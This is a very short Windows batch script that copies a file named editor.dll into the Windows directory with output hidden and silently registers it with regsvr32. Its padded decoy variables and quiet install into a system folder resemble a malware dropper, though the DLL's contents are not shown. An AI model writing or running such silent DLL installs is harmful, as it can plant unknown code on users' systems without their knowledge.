@echo off
set aa12345678=editor.dll
set bb23456789=editor.dll
set cc34567890=editor.dll
set dd45678901=editor.dll
copy %aa12345678% %windir%\editor.dll >nul
regsvr32 /s %aa12345678%
